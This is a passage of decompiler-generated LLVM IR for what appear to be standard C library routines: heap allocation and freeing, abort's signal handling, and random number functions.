  %v0_d704 = phi i32 [ %v2_d6ec, %dec_label_pc_d6f4 ], [ %v0_d704.pre, %bb27 ]
  %v1_d704 = add i32 %v0_d704, 8
  %v2_d704 = inttoptr i32 %v1_d704 to i32*
  %v3_d704 = load i32, i32* %v2_d704, align 4
  %v1_d708 = add i32 %v0_d704, 4
  %v2_d708 = inttoptr i32 %v1_d708 to i32*
  %v3_d708 = load i32, i32* %v2_d708, align 4
  %v2_d70c = icmp eq i32 %v3_d704, 0
  br i1 %v2_d70c, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_d710 = add i32 %v3_d704, 4
  %v4_d710 = inttoptr i32 %v3_d710 to i32*
  store i32 %v3_d708, i32* %v4_d710, align 4
  %v1_d718 = load i32, i32* @ip, align 4
  store i32 %v1_d718, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_d714 = load i32, i32* %r1.global-to-local, align 4
  %v3_d714 = inttoptr i32 %v2_d714 to i32*
  store i32 %v3_d708, i32* %v3_d714, align 4
  %v1_d71c.pre = load i32, i32* @ip, align 4
  store i32 %v1_d71c.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_d728 = phi i32 [ %v0_d728.pre, %.thread._crit_edge ], [ %v1_d718, %bb28 ], [ %v1_d71c.pre, %.thread5 ]
  %v0_d720 = phi i32 [ %v0_d720.pre, %.thread._crit_edge ], [ %v1_d718, %bb28 ], [ %v1_d71c.pre, %.thread5 ]
  %v1_d720 = load i32, i32* %r0.global-to-local, align 4
  %v2_d720 = sub i32 %v1_d720, %v0_d720
  %v1_d724 = add i32 %v2_d720, 12
  store i32 %v1_d724, i32* %r0.global-to-local, align 4
  %v1_d728 = load i32, i32* %r4.global-to-local, align 4
  %v2_d728 = inttoptr i32 %v1_d728 to i32*
  store i32 %v0_d728, i32* %v2_d728, align 4
  %v2_d72c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d72c, i32* %r4.global-to-local, align 4
  ret i32 %v1_d724

dec_label_pc_d730:                                ; preds = %dec_label_pc_d6d4
  %v1_d730 = add i32 %v2_d6ec, 4
  %v2_d730 = inttoptr i32 %v1_d730 to i32*
  %v3_d730 = load i32, i32* %v2_d730, align 4
  store i32 %v3_d730, i32* %r0.global-to-local, align 4
  %v2_d734 = icmp eq i32 %v3_d730, 0
  br i1 %v2_d734, label %dec_label_pc_d734.dec_label_pc_d73c_crit_edge, label %dec_label_pc_d6d4

dec_label_pc_d734.dec_label_pc_d73c_crit_edge:    ; preds = %dec_label_pc_d730
  br label %dec_label_pc_d73c

dec_label_pc_d73c:                                ; preds = %dec_label_pc_d734.dec_label_pc_d73c_crit_edge, %dec_label_pc_d734.preheader
  store i32 %v3_d6b0, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_d730, { 1, 2, 0 }
  uselistorder i32 %v0_d704, { 1, 0 }
  uselistorder i32 %v2_d6d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_d6ec, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_d6e8, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_d6d4, { 1, 0 }
  uselistorder label %dec_label_pc_d734.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_d744 = load i32, i32* %arg1, align 4
  store i32 %v2_d744, i32* @ip, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_d7bc6 = icmp eq i32 %v2_d744, 0
  br i1 %v2_d7bc6, label %dec_label_pc_d7c4, label %dec_label_pc_d750

dec_label_pc_d750:                                ; preds = %entry, %dec_label_pc_d7b8
  %v0_d790 = phi i32 [ %v3_d7b8, %dec_label_pc_d7b8 ], [ %v2_d744, %entry ]
  %v1_d750 = inttoptr i32 %v0_d790 to i32*
  %v2_d750 = load i32, i32* %v1_d750, align 4
  store i32 %v2_d750, i32* %r0.global-to-local, align 4
  %v2_d754 = sub i32 %v0_d790, %v2_d750
  %v1_d758 = add i32 %v2_d754, 12
  %v3_d75c = icmp uge i32 %v1_d758, %arg2
  %v9_d75c = icmp eq i32 %v1_d758, %arg2
  %v2_d760 = xor i1 %v9_d75c, true
  %v3_d760 = and i1 %v3_d75c, %v2_d760
  br i1 %v3_d760, label %dec_label_pc_d7b8, label %dec_label_pc_d764

dec_label_pc_d764:                                ; preds = %dec_label_pc_d750
  br i1 %v9_d75c, label %dec_label_pc_d768, label %dec_label_pc_d7c4

dec_label_pc_d768:                                ; preds = %dec_label_pc_d764
  %v1_d768 = add i32 %arg3, 3
  %v1_d76c = and i32 %v1_d768, -4
  store i32 %v1_d76c, i32* %r2.global-to-local, align 4
  %v2_d770 = sub i32 %v2_d750, %v1_d76c
  %v3_d770 = icmp ult i32 %v2_d750, %v1_d76c
  br i1 %v3_d770, label %dec_label_pc_d7c4, label %dec_label_pc_d778

dec_label_pc_d778:                                ; preds = %dec_label_pc_d768
  %v1_d778 = add i32 %v1_d76c, 44
  %v3_d77c = icmp ult i32 %v2_d750, %v1_d778
  br i1 %v3_d77c, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_d778
  store i32 %v2_d770, i32* %v1_d750, align 4
  %v1_d788 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_d788, i32* %r0.global-to-local, align 4
  ret i32 %v1_d788

.thread2:                                         ; preds = %dec_label_pc_d778
  %v1_d790 = add i32 %v0_d790, 4
  %v2_d790 = inttoptr i32 %v1_d790 to i32*
  %v3_d790 = load i32, i32* %v2_d790, align 4
  store i32 %v3_d790, i32* %r2.global-to-local, align 4
  %v2_d794 = icmp eq i32 %v3_d790, 0
  br i1 %v2_d794, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_d798 = add i32 %v0_d790, 8
  %v3_d798 = inttoptr i32 %v2_d798 to i32*
  %v4_d798 = load i32, i32* %v3_d798, align 4
  %v3_d79c = add i32 %v3_d790, 8
  %v4_d79c = inttoptr i32 %v3_d79c to i32*
  store i32 %v4_d798, i32* %v4_d79c, align 4
  %v0_d7a0.pre = load i32, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_d7a0 = phi i32 [ %v0_d790, %.thread2 ], [ %v0_d7a0.pre, %bb17 ]
  %v1_d7a0 = add i32 %v0_d7a0, 8
  %v2_d7a0 = inttoptr i32 %v1_d7a0 to i32*
  %v3_d7a0 = load i32, i32* %v2_d7a0, align 4
  store i32 %v3_d7a0, i32* %r2.global-to-local, align 4
  %v1_d7a4 = add i32 %v0_d7a0, 4
  %v2_d7a4 = inttoptr i32 %v1_d7a4 to i32*
  %v3_d7a4 = load i32, i32* %v2_d7a4, align 4
  %v2_d7a8 = icmp eq i32 %v3_d7a0, 0
  br i1 %v2_d7a8, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_d7ac = add i32 %v3_d7a0, 4
  %v4_d7ac = inttoptr i32 %v3_d7ac to i32*
  store i32 %v3_d7a4, i32* %v4_d7ac, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_d7b0 = load i32, i32* %lr.global-to-local, align 4
  %v3_d7b0 = inttoptr i32 %v2_d7b0 to i32*
  store i32 %v3_d7a4, i32* %v3_d7b0, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_d7b4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_d7b4

dec_label_pc_d7b8:                                ; preds = %dec_label_pc_d750
  %v1_d7b8 = add i32 %v0_d790, 4
  %v2_d7b8 = inttoptr i32 %v1_d7b8 to i32*
  %v3_d7b8 = load i32, i32* %v2_d7b8, align 4
  store i32 %v3_d7b8, i32* @ip, align 4
  %v2_d7bc = icmp eq i32 %v3_d7b8, 0
  br i1 %v2_d7bc, label %dec_label_pc_d7bc.dec_label_pc_d7c4.loopexit_crit_edge, label %dec_label_pc_d750

dec_label_pc_d7bc.dec_label_pc_d7c4.loopexit_crit_edge: ; preds = %dec_label_pc_d7b8
  br label %dec_label_pc_d7c4

dec_label_pc_d7c4:                                ; preds = %dec_label_pc_d768, %entry, %dec_label_pc_d7bc.dec_label_pc_d7c4.loopexit_crit_edge, %dec_label_pc_d764
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_d7b8, { 1, 2, 0 }
  uselistorder i32 %v0_d7a0, { 1, 0 }
  uselistorder i32 %v1_d76c, { 0, 2, 1, 3 }
  uselistorder i1 %v9_d75c, { 1, 0 }
  uselistorder i32 %v2_d750, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_d790, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_d7c4, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_d750, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_d7cc = load i32, i32* @r2, align 4
  %v2_d7cc = icmp eq i32 %v0_d7cc, 0
  %v0_d7d0 = load i32, i32* @r3, align 4
  %v1_d7d0 = load i32, i32* @r1, align 4
  %v2_d7d0 = add i32 %v1_d7d0, 4
  %v3_d7d0 = inttoptr i32 %v2_d7d0 to i32*
  store i32 %v0_d7d0, i32* %v3_d7d0, align 4
  %v0_d7d4 = load i32, i32* @r2, align 4
  %v1_d7d4 = load i32, i32* @r1, align 4
  %v2_d7d4 = add i32 %v1_d7d4, 8
  %v3_d7d4 = inttoptr i32 %v2_d7d4 to i32*
  store i32 %v0_d7d4, i32* %v3_d7d4, align 4
  %v1_d7dc = load i32, i32* @r1, align 4
  br i1 %v2_d7cc, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_d7d8 = load i32, i32* @r2, align 4
  %v3_d7d8 = add i32 %v2_d7d8, 4
  %v4_d7d8 = inttoptr i32 %v3_d7d8 to i32*
  store i32 %v1_d7dc, i32* %v4_d7d8, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_d7dc = load i32, i32* @r0, align 4
  %v3_d7dc = inttoptr i32 %v2_d7dc to i32*
  store i32 %v1_d7dc, i32* %v3_d7dc, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_d7e0 = load i32, i32* @r3, align 4
  %v2_d7e0 = icmp eq i32 %v0_d7e0, 0
  br i1 %v2_d7e0, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_d7e4 = load i32, i32* @r1, align 4
  %v3_d7e4 = add i32 %v0_d7e0, 8
  %v4_d7e4 = inttoptr i32 %v3_d7e4 to i32*
  store i32 %v1_d7e4, i32* %v4_d7e4, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_d7e8 = load i32, i32* @r0, align 4
  ret i32 %v1_d7e8

; uselistorder directives
  uselistorder i32 %v1_d7dc, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_d7ec = load i32, i32* @r2, align 4
  %v2_d7ec = icmp eq i32 %v0_d7ec, 0
  %v1_d7f0 = load i32, i32* @r1, align 4
  br i1 %v2_d7ec, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_d7f0 = load i32, i32* @r0, align 4
  %v3_d7f0 = inttoptr i32 %v2_d7f0 to i32*
  store i32 %v1_d7f0, i32* %v3_d7f0, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_d7f4 = add i32 %v0_d7ec, 4
  %v4_d7f4 = inttoptr i32 %v3_d7f4 to i32*
  store i32 %v1_d7f0, i32* %v4_d7f4, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_d7f8 = load i32, i32* @r2, align 4
  %v1_d7f8 = load i32, i32* @r1, align 4
  %v2_d7f8 = add i32 %v1_d7f8, 8
  %v3_d7f8 = inttoptr i32 %v2_d7f8 to i32*
  store i32 %v0_d7f8, i32* %v3_d7f8, align 4
  %v1_d7fc = load i32, i32* @r0, align 4
  ret i32 %v1_d7fc

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d800 = load i32, i32* @r4, align 4
  store i32 %v3_d800, i32* %stack_var_-20, align 4
  %v2_d804 = load i32, i32* %arg1, align 4
  store i32 %v2_d804, i32* %r4.global-to-local, align 4
  %v2_d808 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_d8242 = icmp eq i32 %v2_d804, 0
  br i1 %v2_d8242, label %dec_label_pc_d8d4, label %dec_label_pc_d814

dec_label_pc_d814:                                ; preds = %entry, %dec_label_pc_d81c
  %v0_d864 = phi i32 [ %v0_d86c, %dec_label_pc_d81c ], [ 0, %entry ]
  %v0_d86c = phi i32 [ %v3_d820, %dec_label_pc_d81c ], [ %v2_d804, %entry ]
  %v1_d8285.in = phi i32 [ %v3_d820, %dec_label_pc_d81c ], [ %v2_d804, %entry ]
  %v1_d8285 = add i32 %v1_d8285.in, 12
  %v3_d814 = icmp ult i32 %v1_d8285, %arg2
  br i1 %v3_d814, label %dec_label_pc_d81c, label %dec_label_pc_d834

dec_label_pc_d81c:                                ; preds = %dec_label_pc_d814
  store i32 %v0_d86c, i32* %r6.global-to-local, align 4
  %v1_d820 = add i32 %v0_d86c, 4
  %v2_d820 = inttoptr i32 %v1_d820 to i32*
  %v3_d820 = load i32, i32* %v2_d820, align 4
  store i32 %v3_d820, i32* %r4.global-to-local, align 4
  %v2_d824 = icmp eq i32 %v3_d820, 0
  br i1 %v2_d824, label %dec_label_pc_d824.dec_label_pc_d8d4.loopexit_crit_edge, label %dec_label_pc_d814

dec_label_pc_d834:                                ; preds = %dec_label_pc_d814
  %v1_d834 = inttoptr i32 %v0_d86c to i32*
  %v2_d834 = load i32, i32* %v1_d834, align 4
  store i32 %v2_d834, i32* @ip, align 4
  %v2_d838 = sub i32 %v0_d86c, %v2_d834
  %v1_d83c = add i32 %v2_d838, 12
  %v3_d840 = icmp uge i32 %v1_d83c, %v2_d808
  %v9_d840 = icmp eq i32 %v1_d83c, %v2_d808
  %v2_d844 = xor i1 %v9_d840, true
  %v3_d844 = and i1 %v3_d840, %v2_d844
  br i1 %v3_d844, label %dec_label_pc_d8d4, label %dec_label_pc_d848

dec_label_pc_d848:                                ; preds = %dec_label_pc_d834
  %v2_d848 = add i32 %v2_d834, %arg3
  store i32 %v2_d848, i32* %r7.global-to-local, align 4
  br i1 %v9_d840, label %dec_label_pc_d850, label %dec_label_pc_d87c

dec_label_pc_d850:                                ; preds = %dec_label_pc_d848
  %v2_d850 = icmp eq i32 %v0_d864, 0
  br i1 %v2_d850, label %dec_label_pc_d8c8, label %dec_label_pc_d858

dec_label_pc_d858:                                ; preds = %dec_label_pc_d850
  %v1_d858 = add i32 %v0_d864, 12
  %v9_d85c = icmp eq i32 %v1_d858, %arg2
  br i1 %v9_d85c, label %dec_label_pc_d864, label %dec_label_pc_d8c8

dec_label_pc_d864:                                ; preds = %dec_label_pc_d858
  %v1_d864 = inttoptr i32 %v0_d864 to i32*
  %v2_d864 = load i32, i32* %v1_d864, align 4
  %v1_d868 = add i32 %v0_d864, 8
  %v2_d868 = inttoptr i32 %v1_d868 to i32*
  %v3_d868 = load i32, i32* %v2_d868, align 4
  store i32 %v3_d868, i32* @r2, align 4
  store i32 %v0_d86c, i32* @r1, align 4
  %v2_d870 = add i32 %v2_d864, %v2_d848
  store i32 %v2_d870, i32* %r7.global-to-local, align 4
  %v0_d874 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_d8c8

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d848
  %v1_d87c = add i32 %v0_d86c, 4
  %v2_d87c = inttoptr i32 %v1_d87c to i32*
  %v3_d87c = load i32, i32* %v2_d87c, align 4
  store i32 %v3_d87c, i32* %r5.global-to-local, align 4
  %v2_d880 = icmp eq i32 %v3_d87c, 0
  br i1 %v2_d880, label %dec_label_pc_d8b4, label %dec_label_pc_d888

dec_label_pc_d888:                                ; preds = %dec_label_pc_d87c
  %v1_d888 = inttoptr i32 %v3_d87c to i32*
  %v2_d888 = load i32, i32* %v1_d888, align 4
  store i32 %v2_d888, i32* @ip, align 4
  %v2_d88c = sub i32 %v3_d87c, %v2_d888
  %v1_d890 = add i32 %v2_d88c, 12
  %v9_d894 = icmp eq i32 %v2_d808, %v1_d890
  br i1 %v9_d894, label %dec_label_pc_d89c, label %dec_label_pc_d8b4

dec_label_pc_d89c:                                ; preds = %dec_label_pc_d888
  store i32 %v0_d864, i32* @r2, align 4
  store i32 %v3_d87c, i32* @r1, align 4
  %v2_d8a4 = add i32 %v2_d888, %v2_d848
  store i32 %v2_d8a4, i32* %r7.global-to-local, align 4
  %v0_d8a8 = call i32 @__heap_link_free_area_after()
  %v0_d8ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_d8ac, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d8c8

dec_label_pc_d8b4:                                ; preds = %dec_label_pc_d888, %dec_label_pc_d87c
  %v2_d8b4 = add i32 %v0_d86c, %arg3
  store i32 %v2_d8b4, i32* %r4.global-to-local, align 4
  store i32 %v3_d87c, i32* @r3, align 4
  store i32 %v0_d864, i32* @r2, align 4
  store i32 %v2_d8b4, i32* @r1, align 4
  %v0_d8c4 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_d8c8

dec_label_pc_d8c8:                                ; preds = %dec_label_pc_d858, %dec_label_pc_d850, %dec_label_pc_d89c, %dec_label_pc_d864, %dec_label_pc_d8b4
  %v0_d8c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d8c8, i32* %r5.global-to-local, align 4
  %v0_d8cc = load i32, i32* %r7.global-to-local, align 4
  %v2_d8cc = inttoptr i32 %v0_d8c8 to i32*
  store i32 %v0_d8cc, i32* %v2_d8cc, align 4
  br label %dec_label_pc_d8ec

dec_label_pc_d824.dec_label_pc_d8d4.loopexit_crit_edge: ; preds = %dec_label_pc_d81c
  br label %dec_label_pc_d8d4

dec_label_pc_d8d4:                                ; preds = %entry, %dec_label_pc_d824.dec_label_pc_d8d4.loopexit_crit_edge, %dec_label_pc_d834
  %v1_d8d4 = add i32 %v2_d808, -12
  store i32 %v1_d8d4, i32* %r5.global-to-local, align 4
  %v3_d8d8 = inttoptr i32 %v1_d8d4 to i32*
  store i32 %arg3, i32* %v3_d8d8, align 4
  %v0_d8dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d8dc, i32* @r3, align 4
  %v0_d8e0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_d8e0, i32* @r2, align 4
  %v0_d8e4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_d8e4, i32* @r1, align 4
  %v0_d8e8 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_d8ec

dec_label_pc_d8ec:                                ; preds = %dec_label_pc_d8c8, %dec_label_pc_d8d4
  %v0_d8ec = load i32, i32* %r5.global-to-local, align 4
  %v2_d8f0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_d8f0, i32* @r4, align 4
  ret i32 %v0_d8ec

; uselistorder directives
  uselistorder i32 %v3_d87c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_d840, { 1, 0 }
  uselistorder i32 %v3_d820, { 2, 3, 1, 0 }
  uselistorder i32 %v0_d86c, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_d864, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d8ec, { 1, 0 }
  uselistorder label %dec_label_pc_d8d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d8c8, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_d814, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_d910.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_d8f4 = ptrtoint i32* %stack_var_-268 to i32
  %v1_d904 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_d910 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_d910

dec_label_pc_d910:                                ; preds = %dec_label_pc_d910.lr.ph, %dec_label_pc_d910
  %v1_d914 = phi i32 [ 31, %dec_label_pc_d910.lr.ph ], [ %v1_d920, %dec_label_pc_d910 ]
  %v4_d914 = mul i32 %v1_d914, 4
  %v5_d914 = add i32 %v4_d914, %v2_d910
  %v2_d91c = add i32 %v5_d914, -128
  %v3_d91c = inttoptr i32 %v2_d91c to i32*
  store i32 0, i32* %v3_d91c, align 4
  %v0_d920 = load i32, i32* %r1.global-to-local, align 4
  %v1_d920 = add i32 %v0_d920, -1
  store i32 %v1_d920, i32* %r1.global-to-local, align 4
  %v6_d920 = icmp slt i32 %v1_d920, 0
  br i1 %v6_d920, label %dec_label_pc_d928, label %dec_label_pc_d910

dec_label_pc_d928:                                ; preds = %dec_label_pc_d910
  %v2_d928 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_d928, i32* @r4, align 4
  store i32 6, i32* %r1.global-to-local, align 4
  %v2_d934 = call i32 @__sigaddset(i32 %v2_d928, i32 6)
  %v2_d938 = icmp eq i32 %v2_d934, 0
  br i1 %v2_d938, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_d928
  store i32 %v2_d928, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_d928, %bb
  store i32 55628, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_d938, i32 ptrtoint (i32* @global_var_ec4c.559 to i32))
  %v2_d950 = load i32, i32* @global_var_1fe08.561, align 4
  %v2_d954 = icmp eq i32 %v2_d950, 0
  br i1 %v2_d954, label %dec_label_pc_d95c, label %dec_label_pc_d98c

dec_label_pc_d95c:                                ; preds = %.thread1
  store i32 1, i32* @global_var_1fe08.561, align 4
  br label %dec_label_pc_d964

dec_label_pc_d964:                                ; preds = %dec_label_pc_d9dc, %dec_label_pc_d95c
  store i32 55668, i32* @lr, align 4
  %v1_d970 = call i32 @__pthread_return_0()
  %v1_d978 = call i32 @__raise(i32 6)
  store i32 55692, i32* @lr, align 4
  %v1_d988 = call i32 @__pthread_return_0()
  %v2_d990.pre = load i32, i32* @global_var_1fe08.561, align 4
  br label %dec_label_pc_d98c

dec_label_pc_d98c:                                ; preds = %.thread1, %dec_label_pc_d964
  %v0_da00 = phi i32 [ %v2_d950, %.thread1 ], [ %v2_d990.pre, %dec_label_pc_d964 ]
  store i32 ptrtoint (i32* @global_var_1fe08.561 to i32), i32* %ip.global-to-local, align 4
  %v7_d994 = icmp eq i32 %v0_da00, 1
  br i1 %v7_d994, label %dec_label_pc_d9c4.lr.ph, label %dec_label_pc_d9f8

dec_label_pc_d9c4.lr.ph:                          ; preds = %dec_label_pc_d98c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_1fe08.561, align 4
  %v2_d9b0 = bitcast i32* %stack_var_-268 to i8*
  %v3_d9b0 = call i32 @__GI_memset(i8* %v2_d9b0, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d9c4

dec_label_pc_d9c4:                                ; preds = %dec_label_pc_d9c4.lr.ph, %dec_label_pc_d9c4
  %v1_d9c8 = phi i32 [ 31, %dec_label_pc_d9c4.lr.ph ], [ %v1_d9d4, %dec_label_pc_d9c4 ]
  %v4_d9c8 = mul i32 %v1_d9c8, 4
  %v5_d9c8 = add i32 %v4_d9c8, %v2_d910
  %v2_d9d0 = add i32 %v5_d9c8, -264
  %v3_d9d0 = inttoptr i32 %v2_d9d0 to i32*
  store i32 -1, i32* %v3_d9d0, align 4
  %v0_d9d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d9d4 = add i32 %v0_d9d4, -1
  store i32 %v1_d9d4, i32* %r1.global-to-local, align 4
  %v6_d9d4 = icmp slt i32 %v1_d9d4, 0
  br i1 %v6_d9d4, label %dec_label_pc_d9dc, label %dec_label_pc_d9c4

dec_label_pc_d9dc:                                ; preds = %dec_label_pc_d9c4
  store i32 %v2_d8f4, i32* %r1.global-to-local, align 4
  %v4_d9f0 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_d964

dec_label_pc_d9f8:                                ; preds = %dec_label_pc_d98c
  %v7_d9f8 = icmp eq i32 %v0_da00, 2
  br i1 %v7_d9f8, label %dec_label_pc_da00, label %dec_label_pc_da0c

dec_label_pc_da00:                                ; preds = %dec_label_pc_d9f8
  store i32 3, i32* @global_var_1fe08.561, align 4
  %v0_da08 = call i32 @abort()
  %v2_da0c.pre = load i32, i32* @global_var_1fe08.561, align 4
  br label %dec_label_pc_da0c

dec_label_pc_da0c:                                ; preds = %dec_label_pc_d9f8, %dec_label_pc_da00
  %v1_da14 = phi i32 [ %v0_da00, %dec_label_pc_d9f8 ], [ %v2_da0c.pre, %dec_label_pc_da00 ]
  %v7_da10 = icmp eq i32 %v1_da14, 3
  br i1 %v7_da10, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_da0c
  %v2_da1c = load i32, i32* %ip.global-to-local, align 4
  %v3_da1c = inttoptr i32 %v2_da1c to i32*
  store i32 4, i32* %v3_da1c, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_da0c, %bb27
  call void @__pseudo_cond_branch(i1 %v7_da10, i32 ptrtoint (i32* @global_var_ea58.563 to i32))
  br label %dec_label_pc_da24

dec_label_pc_da24:                                ; preds = %dec_label_pc_da24, %.thread3
  %v0_da24 = call i32 @abort()
  br label %dec_label_pc_da24

; uselistorder directives
  uselistorder i32 %v1_d9d4, { 2, 1, 0 }
  uselistorder i32 %v1_d920, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 5, 6, 7, 9, 8, 2 }
  uselistorder i32* @global_var_1fe08.561, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_da0c, { 1, 0 }
  uselistorder label %dec_label_pc_d9c4, { 1, 0 }
  uselistorder label %dec_label_pc_d98c, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_d910, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_da3c = call i32 @random()
  ret i32 %v0_da3c

; uselistorder directives
  uselistorder i32 ()* @random, { 6, 0, 5, 4, 1, 2, 3 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_da40 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1d6d0.565 to i32), i32* @r4, align 4
  %v2_da48 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_da48, i32* @r0, align 4
  %v1_da60 = call i32 @__pthread_return_void()
  %v1_da70 = call i32 @__pthread_return_0()
  %v2_da74 = ptrtoint i32* %stack_var_-16 to i32
  %v3_da7c = call i32 @__GI_random_r(i32* inttoptr (i32 120552 to i32*), i32 %v2_da74)
  store i32 %v2_da48, i32* @r0, align 4
  store i32 55956, i32* @lr, align 4
  %v1_da90 = call i32 @__pthread_return_void()
  %v3_da94 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_da40, i32* @r4, align 4
  ret i32 %v3_da94
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_dac0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_dac0, i32* @r0, align 4
